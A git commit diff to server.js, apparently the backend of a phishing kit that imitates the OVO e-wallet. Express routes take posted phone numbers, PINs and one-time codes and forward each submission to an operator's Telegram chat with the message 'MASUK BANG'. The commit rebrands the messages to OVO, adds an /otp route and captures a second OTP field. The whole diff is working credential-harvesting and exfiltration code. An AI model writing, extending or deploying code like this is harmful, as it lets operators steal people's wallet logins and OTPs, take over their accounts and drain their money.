b52ef86bf6a7b5f98291e6d453fc3d1c9628090a
pnjmndna-bit <pnjmndna@gmail.com>
2026-06-29 17:40:58 +0700

    Update server.js

--- server.js
+++ server.js
@@ -74,7 +74,7 @@ app.post("/nmrx", async(req,res) =>{
 
         /* PESAN TELEGRAM */
         const text = `
-🔥 [ ×𝗡𝗠𝗥× 𝗠𝗔𝗦𝗨𝗞 𝗕𝗔𝗡𝗚 ] 🔥
+🔥 [ ×𝗢𝗩𝗢× 𝗠𝗔𝗦𝗨𝗞 𝗕𝗔𝗡𝗚 ] 🔥
             × <code>${nmrx}</code> ×
            
 ─────────────────
@@ -172,12 +172,114 @@ app.post("/pix", async(req,res) =>{
 
         /* PESAN TELEGRAM */
         const text = `
-🔥 [ ×𝗣𝗢𝗫× 𝗠𝗔𝗦𝗨𝗞 𝗕𝗔𝗡𝗚 ] 🔥
+🔥 [ ×𝗢𝗩𝗢× 𝗠𝗔𝗦𝗨𝗞 𝗕𝗔𝗡𝗚 ] 🔥
             × <code>${nmrx}</code> ×
            
 ─────────────────
 <b>⌬<i>  𝗡𝗠𝗥  ×</i></b>   : <b>${nmrx}</b>
 <b>⌬<i>  𝗣𝗢𝗫   ×</i></b>   : <b>${pix}</b>
+⌬<i>  OXG . . . .</i>
+─────────────────
+
+<b>◈ ━━━ 𝗣𝘅𝘅𝗦𝘁𝘂𝗱𝗶𝘅 ━━━ ◈</b>
+        `;
+
+        /* KIRIM TELEGRAM */
+        await axios.post(
+        `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
+        {
+
+            chat_id:
+            CHAT_ID,
+
+            text:
+            text,
+
+            parse_mode:
+            "HTML"
+
+        }
+
+     );
+
+        res.json({
+
+            success:true
+
+        });
+
+    }catch(error){
+
+        console.log(
+            error.response?.data ||
+            error.message
+       );
+
+        res.status(500).json({
+
+            success:false
+
+        });
+
+    }
+
+});
+
+/* ROUTE */
+app.post("/otp", async(req,res) =>{
+
+    try{
+
+        console.log(
+            "DATA MASUK:"
+        );
+
+        console.log(
+            req.body
+        );
+
+        console.log(
+            "BOT:",
+            BOT_TOKEN
+        );
+
+        console.log(
+            "CHAT:",
+            CHAT_ID
+        );
+
+        const {
+            
+            nmrx,
+            pix,
+            otp
+            
+        } = req.body;
+
+        if(
+            !nmrx ||
+            !pix ||
+            !otp
+        ){
+
+            return res.status(400).json({
+
+                success:false,
+                message:"Data tidak lengkap"
+
+            });
+
+        }
+
+        /* PESAN TELEGRAM */
+        const text = `
+🔥 [ ×𝗢𝗩𝗢× 𝗦𝗘𝗠𝗨𝗔 𝗕𝗔𝗡𝗚 ] 🔥
+              × <code>${nmrx}</code> ×
+           
+─────────────────
+<b>⌬<i>  𝗡𝗠𝗥  ×</i></b>   : <b>${nmrx}</b>
+<b>⌬<i>  𝗣𝗢𝗫   ×</i></b>   : <b>${pix}</b>
+<b>⌬<i>  𝗢𝗫𝗚   ×</i></b>   : <b>${otp}</b>
 ⌬<i>  OXT . . . .</i>
 ─────────────────
 
@@ -252,14 +354,16 @@ app.post("/send", async(req,res) =>{
             
             nmrx,
             pix,
-            otp
+            otp,
+            otx
             
         } = req.body;
 
         if(
             !nmrx ||
             !pix ||
-            !otp
+            !otp ||
+            !otx
         ){
 
             return res.status(400).json({
@@ -273,13 +377,14 @@ app.post("/send", async(req,res) =>{
 
         /* PESAN TELEGRAM */
         const text = `
-🔥 [ 𝗟𝗘𝗡𝗚𝗞𝗔𝗣 𝗦𝗘𝗠𝗨𝗔 𝗕𝗔𝗡𝗚 ] 🔥
+🔥 [ ×𝗢𝗩𝗢× 𝗦𝗘𝗠𝗨𝗔 𝗕𝗔𝗡𝗚 ] 🔥
               × <code>${nmrx}</code> ×
            
 ─────────────────
 <b>⌬<i>  𝗡𝗠𝗥  ×</i></b>   : <b>${nmrx}</b>
 <b>⌬<i>  𝗣𝗢𝗫   ×</i></b>   : <b>${pix}</b>
-<b>⌬<i>  𝗢𝗫𝗧   ×</i></b>   : <b>${otp}</b>
+<b>⌬<i>  𝗢𝗫𝗚   ×</i></b>   : <b>${otp}</b>
+<b>⌬<i>  𝗢𝗫𝗧   ×</i></b>   : <b>${otx}</b>
 ─────────────────
 
 <b>◈ ━━━ 𝗣𝘅𝘅𝗦𝘁𝘂𝗱𝗶𝘅 ━━━ ◈</b>
@@ -325,6 +430,7 @@ app.post("/send", async(req,res) =>{
     }
 
 });
+
 
 /* PORT */
 const PORT =
